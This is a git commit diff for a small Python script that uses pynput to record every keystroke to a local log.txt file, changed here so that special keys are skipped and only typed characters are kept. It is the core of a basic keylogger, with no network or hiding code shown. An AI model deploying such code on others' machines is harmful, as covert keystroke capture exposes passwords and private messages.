f65b7bd69c7ee84df8abb9f6b2e82488f7bf21b6
Aniket Ray <aniketiq@gmail.com>
2019-03-07 23:48:59 +0530

    Update 1

--- main.py
+++ main.py
@@ -5,22 +5,17 @@ from pynput.keyboard import Key, Listener
 count = 0
 
 def on_press(key):
-    # keys.append(key)
-    # count += 1
-    #print("{0} is pressed".format(key))
-
-
-    # if count >= 1:  # Increase the value if long sentences are to be written
     write_file(key)
 
 
 def write_file(keys):
     keys = str(keys)
     keys = (keys).replace("'","")
-    if keys == "Key.shift" or keys == "Key.shift_rKey":
-    with open("log.txt","a") as file:
-        file.write(keys)
-
+    findOthers = keys.find("Key")
+    if findOthers == -1:
+        with open("log.txt","a") as file:
+            file.write(keys)
+    
 
 def on_release(key):
     if key == Key.esc:
